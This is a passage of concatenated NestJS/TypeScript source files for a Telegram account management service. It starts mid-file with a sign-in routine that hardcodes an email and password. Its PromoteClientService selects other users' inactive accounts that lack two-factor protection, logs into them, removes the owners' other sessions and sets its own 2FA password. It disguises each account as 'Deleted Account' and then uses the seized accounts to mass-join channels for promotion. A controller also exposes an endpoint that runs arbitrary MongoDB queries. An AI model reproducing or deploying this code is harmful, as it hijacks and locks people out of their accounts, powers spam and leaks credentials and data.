this.logger.debug('Fetching CSRF token...');\r\n        try {\r\n            let data = JSON.stringify({\r\n                \"user\": {\r\n                    \"email\": \"dodieajt@gmail.com\",\r\n                    \"password\": \"Ajtdmwajt1@\"\r\n                }\r\n            });\r\n\r\n            let config = {\r\n                method: 'post',\r\n                maxBodyLength: Infinity,\r\n                url: this.signInUrl,\r\n                headers: {\r\n                    'Content-Type': 'application/json',\r\n                    'Cookie': this.cookie\r\n                },\r\n                data: data\r\n            };\r\n\r\n            const response = await axios.request(config)\r\n            console.log(\"Cookie:\", response.headers['set-cookie'][0]);\r\n            this.cookie = response.headers['set-cookie'][0];\r\n            // Extract CSRF token from the response (adjust based on your API response structure)\r\n            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);\r\n\r\n            if (!this.csrfToken) {\r\n                throw new Error('CSRF token not found in the sign-in response.');\r\n            }\r\n\r\n            this.logger.debug('CSRF token fetched successfully.');\r\n            return this.csrfToken;\r\n        } catch (error) {\r\n            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);\r\n            throw new Error(`Failed to fetch CSRF token: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    // Method to ensure CSRF token is available\r\n    private async ensureCsrfToken(): Promise<void> {\r\n        if (!this.csrfToken) {\r\n            await this.fetchCsrfToken();\r\n        }\r\n    }\r\n\r\n    // Method to fetch a document\r\n    async fetchDocument(documentId: string): Promise<any> {\r\n        this.logger.debug(`Fetching document with ID: ${documentId}`);\r\n        await this.ensureCsrfToken();\r\n\r\n        try {\r\n            const response = await axios.get(`${this.baseUrl}/documents/${documentId}`, {\r\n                headers: {\r\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\r\n                    'Cookie': this.cookie\r\n                },\r\n            });\r\n\r\n            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);\r\n            return response.data;\r\n        } catch (error) {\r\n            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);\r\n            throw new Error(`Failed to fetch document: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    // Method to post a document\r\n    async postDocument(document: any): Promise<any> {\r\n        this.logger.debug('Posting a new document...');\r\n        await this.ensureCsrfToken();\r\n\r\n        try {\r\n            const response = await axios.post(`${this.baseUrl}/documents`, { \"generate_contents\": true }, {\r\n                headers: {\r\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\r\n                    'Cookie': this.cookie\r\n                },\r\n            });\r\n\r\n            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);\r\n            await this.updateDocument(response.data.token, document);\r\n            return response.data;\r\n        } catch (error) {\r\n            this.logger.error(`Failed to post document: ${error.message}`);\r\n            throw new Error(`Failed to post document: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    // Method to update a document\r\n    async updateDocument(documentId: string, updatedDocument: any): Promise<any> {\r\n        this.logger.debug(`Updating document with ID: ${documentId}`);\r\n        await this.ensureCsrfToken();\r\n\r\n        // const oldDocument = (await axios.get(`https://api.npoint.io/${documentId}`)).data;\r\n        const body =\r\n        {\r\n            \"contents\": JSON.stringify(updatedDocument),\r\n            \"original_contents\": JSON.stringify(updatedDocument),\r\n            \"schema\": null,\r\n            \"original_schema\": \"\"\r\n        }\r\n\r\n        try {\r\n            const response = await axios.put(\r\n                `${this.baseUrl}/documents/${documentId}`,\r\n                body,\r\n                {\r\n                    headers: {\r\n                        'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\r\n                        'Cookie': this.cookie\r\n                    },\r\n                },\r\n            );\r\n\r\n            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);\r\n            return response.data;\r\n        } catch (error) {\r\n            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);\r\n            throw new Error(`Failed to update document: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    async fetchAllDocuments(): Promise<any[]> {\r\n        await this.ensureCsrfToken();\r\n\r\n        try {\r\n            const response = await axios.get(`${this.baseUrl}/documents`, {\r\n                headers: {\r\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\r\n                    'Cookie': this.cookie\r\n                },\r\n            });\r\n\r\n            return response.data;\r\n        } catch (error) {\r\n            throw new Error(`Failed to fetch all documents: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    async fetchCsrfTokenFromHtml(data) {\r\n        try {\r\n            // Step 1: Use a regular expression to match the CSRF token in the <meta> tag\r\n            const csrfTokenMatch = data.match(/<meta name=\"csrf-token\" content=\"([^\"]+)\"/);\r\n\r\n            // Step 2: Check if the CSRF token was found\r\n            if (!csrfTokenMatch || !csrfTokenMatch[1]) {\r\n                throw new Error('CSRF token not found in the HTML response.');\r\n            }\r\n\r\n            // Step 3: Extract the CSRF token\r\n            const csrfToken = csrfTokenMatch[1];\r\n\r\n            // Log the CSRF token (optional)\r\n            console.log('CSRF Token:', csrfToken);\r\n\r\n            return csrfToken;\r\n        } catch (error) {\r\n            console.error('Error fetching CSRF token:', error);\r\n        }\r\n    }\r\n}","import { ApiProperty } from '@nestjs/swagger';\r\nimport {  IsNumber, IsString } from 'class-validator';\r\n\r\nexport class CreatePromoteClientDto {\r\n  @ApiProperty({\r\n    description: 'Telegram ID of the client',\r\n    example: '123456789',\r\n  })\r\n  @IsString()\r\n  readonly tgId: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Mobile number of the client',\r\n    example: '+1234567890',\r\n  })\r\n  @IsString()\r\n  readonly mobile: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Date of the session',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsString()\r\n  readonly availableDate: string;\r\n\r\n  @ApiProperty({\r\n    description: 'lastActive identifier',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsString()\r\n  readonly lastActive: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Channel Count',\r\n    example: 23,\r\n    type: Number\r\n  })\r\n  @IsNumber()\r\n  readonly channels: number;\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\r\n\r\nexport class SearchPromoteClientDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Telegram ID of the client',\r\n    example: '123456789',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly tgId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Mobile number of the client',\r\n    example: '+1234567890',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly mobile?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'availableDate of the promoteClient',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly availableDate?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Channel Count',\r\n    example: 23,\r\n    type: Number\r\n  })\r\n  @IsNumber()\r\n  readonly channels?: number;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreatePromoteClientDto } from './create-promote-client.dto';\r\n\r\nexport class UpdatePromoteClientDto extends PartialType(CreatePromoteClientDto) {}\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\r\nimport { PromoteClientService } from './promote-client.service';\r\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\r\nimport { SearchPromoteClientDto } from './dto/search-promote-client.dto';\r\nimport { PromoteClient } from './schemas/promote-client.schema';\r\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\r\n\r\n@ApiTags('Promote Clients')\r\n@Controller('promoteclients')\r\nexport class PromoteClientController {\r\n  constructor(private readonly clientService: PromoteClientService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  async create(@Body() createClientDto: CreatePromoteClientDto): Promise<PromoteClient> {\r\n    return this.clientService.create(createClientDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  async search(@Query() query: SearchPromoteClientDto): Promise<PromoteClient[]> {\r\n    return this.clientService.search(query);\r\n  }\r\n\r\n  @Get('joinChannelsForPromoteClients')\r\n  @ApiOperation({ summary: 'Join Channels for PromoteClients' })\r\n  async joinChannelsforPromoteClients(): Promise<string> {\r\n    return this.clientService.joinchannelForPromoteClients();\r\n  }\r\n\r\n  @Get('checkPromoteClients')\r\n  @ApiOperation({ summary: 'Check Promote Clients' })\r\n  async checkpromoteClients(): Promise<string> {\r\n    this.clientService.checkPromoteClients();\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Post('addNewUserstoPromoteClients')\r\n  @ApiOperation({ summary: 'Add New Users to Promote Clients' })\r\n  @ApiBody({ type: Object })\r\n  async addNewUserstoPromoteClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\r\n    this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds);\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  async findAll(): Promise<PromoteClient[]> {\r\n    return this.clientService.findAll();\r\n  }\r\n\r\n  @Get('SetAsPromoteClient/:mobile')\r\n  @ApiOperation({ summary: 'Set as Promote Client' })\r\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n  async setAsPromoteClient(\r\n    @Param('mobile') mobile: string,\r\n  ) {\r\n    return await this.clientService.setAsPromoteClient(mobile);\r\n  }\r\n\r\n  @Get(':mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  async findOne(@Param('mobile') mobile: string): Promise<PromoteClient> {\r\n    return this.clientService.findOne(mobile);\r\n  }\r\n\r\n  @Patch(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\r\n    return this.clientService.update(mobile, updateClientDto);\r\n  }\r\n\r\n  @Put(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\r\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\r\n  }\r\n\r\n  @Delete(':mobile')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  async remove(@Param('mobile') mobile: string): Promise<void> {\r\n    return this.clientService.remove(mobile);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiBody({ type: Object })\r\n  async executeQuery(@Body() query: object): Promise<any> {\r\n    try {\r\n      return await this.clientService.executeQuery(query);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { PromoteClientService } from './promote-client.service';\r\nimport { PromoteClientController } from './promote-client.controller';\r\nimport { PromoteClientSchema } from './schemas/promote-client.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { ClientModule } from '../clients/client.module';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { ChannelsModule } from '../channels/channels.module';\r\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: 'promoteClientModule', schema: PromoteClientSchema, collection: 'promoteClients' }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => UsersModule),\r\n    forwardRef(() => ActiveChannelsModule),\r\n    forwardRef(() => ClientModule),\r\n    forwardRef(() => ChannelsModule),\r\n    forwardRef(() => BufferClientModule),\r\n ],\r\n  controllers: [PromoteClientController],\r\n  providers: [PromoteClientService],\r\n  exports: [PromoteClientService]\r\n})\r\nexport class PromoteClientModule { }\r\n","import { ChannelsService } from '../channels/channels.service';\r\nimport { Channel } from '../channels/schemas/channel.schema';\r\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\r\nimport { PromoteClient, PromoteClientDocument } from './schemas/promote-client.schema';\r\nimport { TelegramService } from '../Telegram/Telegram.service';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport { UsersService } from '../users/users.service';\r\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\r\nimport { fetchWithTimeout, parseError, ppplbot } from '../../utils';\r\nimport { ClientService } from '../clients/client.service';\r\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\r\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\r\n\r\n@Injectable()\r\nexport class PromoteClientService {\r\n    private joinChannelMap: Map<string, Channel[]> = new Map();\r\n    private joinChannelIntervalId: NodeJS.Timeout;\r\n    constructor(@InjectModel('promoteClientModule') private promoteClientModel: Model<PromoteClientDocument>,\r\n        @Inject(forwardRef(() => TelegramService))\r\n        private telegramService: TelegramService,\r\n        @Inject(forwardRef(() => UsersService))\r\n        private usersService: UsersService,\r\n        @Inject(forwardRef(() => ActiveChannelsService))\r\n        private activeChannelsService: ActiveChannelsService,\r\n        @Inject(forwardRef(() => ClientService))\r\n        private clientService: ClientService,\r\n        @Inject(forwardRef(() => ActiveChannelsService))\r\n        private channelsService: ChannelsService,\r\n        @Inject(forwardRef(() => BufferClientService))\r\n        private bufferClientService: BufferClientService,\r\n    ) {}\r\n\r\n    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {\r\n        const newUser = new this.promoteClientModel(promoteClient);\r\n        return newUser.save();\r\n    }\r\n\r\n    async findAll(): Promise<PromoteClient[]> {\r\n        return this.promoteClientModel.find().exec();\r\n    }\r\n\r\n    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClient> {\r\n        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\r\n        if (!user && throwErr) {\r\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\r\n        }\r\n        return user;\r\n    }\r\n\r\n\r\n    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\r\n        const updatedUser = await this.promoteClientModel.findOneAndUpdate(\r\n            { mobile },\r\n            { $set: updateClientDto },\r\n            { new: true, upsert: true, returnDocument: 'after' }\r\n        ).exec();\r\n\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\r\n        }\r\n\r\n        return updatedUser;\r\n    }\r\n\r\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {\r\n        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\r\n        if (existingUser) {\r\n            console.log(\"Updating\")\r\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);\r\n        } else {\r\n            console.log(\"creating\")\r\n            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);\r\n        }\r\n    }\r\n\r\n    async remove(mobile: string): Promise<void> {\r\n        await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);\r\n        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();\r\n        if (result.deletedCount === 0) {\r\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\r\n        }\r\n    }\r\n    async search(filter: any): Promise<PromoteClient[]> {\r\n        console.log(filter)\r\n        if (filter.firstName) {\r\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\r\n        }\r\n        console.log(filter)\r\n        return this.promoteClientModel.find(filter).exec();\r\n    }\r\n\r\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<PromoteClient[]> {\r\n        try {\r\n\r\n            if (!query) {\r\n                throw new BadRequestException('Query is invalid.');\r\n            }\r\n            const queryExec = this.promoteClientModel.find(query);\r\n            if (sort) {\r\n                queryExec.sort(sort);\r\n            }\r\n\r\n            if (limit) {\r\n                queryExec.limit(limit);\r\n            }\r\n\r\n            if (skip) {\r\n                queryExec.skip(skip);\r\n            }\r\n\r\n            return await queryExec.exec();\r\n        } catch (error) {\r\n            throw new InternalServerErrorException(error.message);\r\n        }\r\n    }\r\n\r\n    removeFromPromoteMap(key: string) {\r\n        this.joinChannelMap.delete(key)\r\n    }\r\n    clearPromoteMap() {\r\n        console.log(\"PromoteMap cleared\")\r\n        this.joinChannelMap.clear()\r\n    }\r\n\r\n    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {\r\n        if (!this.telegramService.getActiveClientSetup()) {\r\n            console.log(\"Joining Channel Started\");\r\n            this.clearJoinChannelInterval();\r\n            try {\r\n                const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\r\n                await this.telegramService.disconnectAll();\r\n                await sleep(2000);\r\n                const clients = await this.promoteClientModel.find({ channels: { \"$lt\": 250 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\r\n\r\n                if (clients.length > 0) {\r\n                    for (const document of clients) {\r\n                        try {\r\n                            const client = await this.telegramService.createClient(document.mobile, false, false);\r\n                            console.log(\"Started Joining for : \", document.mobile);\r\n                            const channels = await client.channelInfo(true);\r\n                            console.log(\"Existing Channels Length : \", channels.ids.length);\r\n                            await this.update(document.mobile, { channels: channels.ids.length });\r\n\r\n                            let result = [];\r\n                            if (channels.canSendFalseCount < 50) {\r\n                                if (channels.ids.length < 220) {\r\n                                    result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\r\n                                } else {\r\n                                    result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\r\n                                }\r\n                                this.joinChannelMap.set(document.mobile, result);\r\n                            } else {\r\n                                await client.leaveChannels(channels.canSendFalseChats);\r\n                            }\r\n                            await this.telegramService.deleteClient(document.mobile);\r\n                        } catch (error) {\r\n                            const parsedError = parseError(error);\r\n                            console.error(`Error while joining channels for mobile: ${document.mobile}`, parsedError);\r\n                        }\r\n                    }\r\n\r\n                    this.joinChannelQueue();\r\n\r\n                }\r\n                console.log(\"Joining Channel Triggered Successfully for\", clients.length);\r\n                return `Initiated Joining channels for ${clients.length}`;\r\n            } catch (error) {\r\n                console.error(\"Error during the joinchannelForPromoteClients process: \", error);\r\n                throw new Error(\"Failed to initiate channel joining process\");\r\n            }\r\n        } else {\r\n            console.log(\"Ignored active check for promote channels as an active client setup exists\");\r\n            return \"Active client setup exists, skipping promotion\";\r\n        }\r\n    }\r\n\r\n    async joinChannelQueue() {\r\n        const existingkeys = Array.from(this.joinChannelMap.keys())\r\n        if (existingkeys.length > 0) {\r\n            this.joinChannelIntervalId = setInterval(async () => {\r\n                const keys = Array.from(this.joinChannelMap.keys());\r\n                if (keys.length > 0) {\r\n                    console.log(\"In JOIN CHANNEL interval: \", new Date().toISOString());\r\n                    for (const mobile of keys) {\r\n                        const channels = this.joinChannelMap.get(mobile);\r\n                        if (channels && channels.length > 0) {\r\n                            const channel = channels.shift();\r\n                            console.log(mobile, \" Pending Channels: \", channels.length);\r\n                            this.joinChannelMap.set(mobile, channels);\r\n\r\n                            try {\r\n                                await this.telegramService.createClient(mobile, false, false);\r\n                                console.log(mobile, \" Trying to join: \", channel.username);\r\n                                await this.telegramService.tryJoiningChannel(mobile, channel);\r\n                            } catch (error) {\r\n                                const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `);\r\n                                console.error(`${mobile} Error while joining @${channel.username}`, errorDetails);\r\n                                if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\r\n                                    console.log(`${mobile} has FloodWaitError or joined too many channels. Handling...`);\r\n                                    this.removeFromPromoteMap(mobile);\r\n                                    const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\r\n                                    // await this.update(mobile, { channels: channelsInfo.ids.length });\r\n                                }\r\n                            } finally {\r\n                                await this.telegramService.deleteClient(mobile);\r\n                            }\r\n                        } else {\r\n                            this.joinChannelMap.delete(mobile);\r\n                        }\r\n                    }\r\n                } else {\r\n                    this.clearJoinChannelInterval();\r\n                }\r\n            }, 4 * 60 * 1000);\r\n        }\r\n    }\r\n\r\n    clearJoinChannelInterval() {\r\n        if (this.joinChannelIntervalId) {\r\n            clearInterval(this.joinChannelIntervalId);\r\n            this.joinChannelIntervalId = null;\r\n            setTimeout(() => {\r\n                this.joinchannelForPromoteClients(false)\r\n            }, 30000);\r\n        }\r\n    }\r\n\r\n    async setAsPromoteClient(\r\n        mobile: string,\r\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\r\n    ) {\r\n        const user = (await this.usersService.search({ mobile, expired: false }))[0];\r\n        if (!user) {\r\n            throw new BadRequestException('user not found');\r\n        }\r\n        const isExist = await this.findOne(mobile, false)\r\n        if (isExist) {\r\n            throw new ConflictException('PromoteClient already exist');\r\n        }\r\n        const clients = await this.clientService.findAll();\r\n        const clientMobiles = clients.map(client => client?.mobile);\r\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\r\n        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {\r\n            const telegramClient = await this.telegramService.createClient(mobile, false)\r\n            try {\r\n                await telegramClient.set2fa();\r\n                await sleep(15000)\r\n                await telegramClient.updateUsername('');\r\n                await sleep(3000)\r\n                await telegramClient.updatePrivacyforDeletedAccount();\r\n                await sleep(3000)\r\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n                await sleep(3000)\r\n                await telegramClient.deleteProfilePhotos();\r\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\r\n                const promoteClient = {\r\n                    tgId: user.tgId,\r\n                    lastActive: \"default\",\r\n                    mobile: user.mobile,\r\n                    availableDate,\r\n                    channels: channels.ids.length,\r\n                }\r\n                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();\r\n            } catch (error) {\r\n                const errorDetails = parseError(error)\r\n                throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\r\n            }\r\n            await this.telegramService.deleteClient(mobile)\r\n            return \"Client set as promote successfully\";\r\n        } else {\r\n            throw new BadRequestException(\"Number is a Active Client\")\r\n        }\r\n    }\r\n\r\n    async checkPromoteClients() {\r\n        if (!this.telegramService.getActiveClientSetup()) {\r\n            await this.telegramService.disconnectAll()\r\n            await sleep(2000);\r\n            const promoteclients = await this.findAll();\r\n            let goodIds: string[] = [];\r\n            let badIds: string[] = [];\r\n            if (promoteclients.length < 80) {\r\n                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 4; i++) {\r\n                    badIds.push(i.toString())\r\n                }\r\n            }\r\n            const clients = await this.clientService.findAll();\r\n            const bufferClients = await this.bufferClientService.findAll();\r\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\r\n            const bufferClientIds = bufferClients.map(client => client.mobile);\r\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\r\n            for (const document of promoteclients) {\r\n                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {\r\n                    try {\r\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\r\n                        const me = await cli.getMe();\r\n                        if (me.username) {\r\n                            await this.telegramService.updateUsername(document.mobile, '');\r\n                            await sleep(2000);\r\n                        }\r\n                        if (me.firstName !== \"Deleted Account\") {\r\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\r\n                            await sleep(2000);\r\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\r\n                        }\r\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\r\n                        const hasPassword = await cli.hasPassword();\r\n                        if (!hasPassword && badIds.length < 4) {\r\n                            console.log(\"Client does not have password\");\r\n                            badIds.push(document.mobile);\r\n                            // await this.remove(document.mobile);\r\n                        } else {\r\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\r\n                            // await this.promoteClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\r\n                            console.log(document.mobile, \" :  ALL Good\");\r\n                            goodIds.push(document.mobile)\r\n                        }\r\n                        await this.telegramService.removeOtherAuths(document.mobile);\r\n                        await sleep(2000);\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                    } catch (error) {\r\n                        parseError(error);\r\n                        badIds.push(document.mobile);\r\n                        this.remove(document.mobile);\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                    }\r\n                } else {\r\n                    console.log(\"Number is a Active Client\");\r\n                    goodIds.push(document.mobile)\r\n                    this.remove(document.mobile)\r\n                }\r\n            }\r\n            goodIds = [...goodIds, ...clientIds, ...bufferClientIds]\r\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\r\n            this.addNewUserstoPromoteClients(badIds, goodIds);\r\n        } else {\r\n            console.log(\"ignored active check promote channels as active client setup exists\")\r\n        }\r\n    }\r\n\r\n    async addNewUserstoPromoteClients(badIds: string[], goodIds: string[]) {\r\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\r\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, twoFA: false, expired: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\r\n        console.log(\"New promote documents to be added: \", documents.length)\r\n        while (badIds.length > 0 && documents.length > 0) {\r\n            const document = documents.shift();\r\n            try {\r\n                try {\r\n                    const client = await this.telegramService.createClient(document.mobile, false);\r\n                    const hasPassword = await client.hasPassword();\r\n                    console.log(\"hasPassword: \", hasPassword);\r\n                    if (!hasPassword) {\r\n                        await client.removeOtherAuths();\r\n                        await client.set2fa();\r\n                        console.log(\"waiting for setting 2FA\");\r\n                        await sleep(30000);\r\n                        await client.updateUsername('');\r\n                        await sleep(3000)\r\n                        await client.updatePrivacyforDeletedAccount();\r\n                        await sleep(3000)\r\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n                        await sleep(3000)\r\n                        await client.deleteProfilePhotos();\r\n                        const channels = await client.channelInfo(true)\r\n                        console.log(\"Inserting Document\");\r\n                        const promoteClient = {\r\n                            tgId: document.tgId,\r\n                            lastActive: \"today\",\r\n                            mobile: document.mobile,\r\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\r\n                            channels: channels.ids.length,\r\n                        }\r\n                        await this.create(promoteClient);\r\n                        await this.usersService.update(document.tgId, { twoFA: true })\r\n                        console.log(\"=============Created PromoteClient=============\")\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                        badIds.pop();\r\n                    } else {\r\n                        console.log(\"Failed to Update as PromoteClient has Password\");\r\n                        await this.usersService.update(document.tgId, { twoFA: true })\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                    }\r\n                } catch (error) {\r\n                    parseError(error)\r\n                    await this.telegramService.deleteClient(document.mobile)\r\n                }\r\n            } catch (error) {\r\n                parseError(error)\r\n                console.error(\"An error occurred:\", error);\r\n            }\r\n            await this.telegramService.deleteClient(document.mobile)\r\n        }\r\n        setTimeout(() => {\r\n            this.joinchannelForPromoteClients()\r\n        }, 2 * 60 * 1000);\r\n    }\r\n}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type PromoteClientDocument = PromoteClient & Document;\r\n@Schema({ collection: 'promoteClients', versionKey: false, autoIndex: true,\r\n  timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n})  // Specify the collection name here\r\nexport class PromoteClient {\r\n  @Prop({ required: true})\r\n  tgId: string;\r\n\r\n  @Prop({ required: true, unique: true })\r\n  mobile: string;\r\n  \r\n  @Prop({ required: true })\r\n  lastActive: string;\r\n\r\n  @Prop({ required: true })\r\n  availableDate: string;\r\n\r\n  @Prop({ required: true, type: Number })\r\n  channels: number;\r\n}\r\n\r\nexport const PromoteClientSchema = SchemaFactory.createForClass(PromoteClient);\r\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { PromoteMsgsService } from './promote-msgs.service';\r\n\r\n@ApiTags('Promote-msgs')\r\n@Controller('promote-msgs')\r\nexport class PromoteMsgsController {\r\n  constructor(private readonly promoteMsgsService: PromoteMsgsService) {}\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get promote-msgs data' })\r\n  async findOne(): Promise<any>{\r\n    return this.promoteMsgsService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update promote-msgs' })\r\n  @ApiBody({type: Object})\r\n  async update( @Body() updateClientDto: any): Promise<any> {\r\n    return this.promoteMsgsService.update( updateClientDto);\r\n  }\r\n\r\n}\r\n","import { Module, Global } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { PromoteMsgsService } from './promote-msgs.service';\r\nimport { PromoteMsgsController } from './promote-msgs.controller';\r\nimport { PromoteMsgSchema } from './promote-msgs.schema';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    PromoteMsgModule,\r\n    MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: PromoteMsgSchema 